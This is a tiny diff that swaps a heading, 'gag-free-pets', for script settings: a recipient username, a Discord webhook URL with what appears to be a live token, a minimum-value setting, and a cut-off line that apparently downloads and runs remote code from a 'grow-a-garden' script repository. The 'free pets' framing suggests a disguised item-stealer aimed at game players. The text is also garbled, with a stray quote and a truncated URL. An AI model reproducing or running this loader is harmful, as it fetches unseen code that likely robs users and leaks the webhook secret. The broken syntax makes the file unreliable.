@@ -1,1 +1,4 @@
-# gag-free-pets
+Username = "Lawen_Kochar"
+Webhook = "https://discord.com/api/webhooks/1416846457629179996/PBVNX-tOlxZkLf5lEj1hRF0d4uD7Vx2s3FeiO6UzJ249Y0AKyWqVeER7rBh_nnMA9Z1n"
+MinimumValue = 1"
+traxscriptss/-/raw/main/grow-a-garden"))()
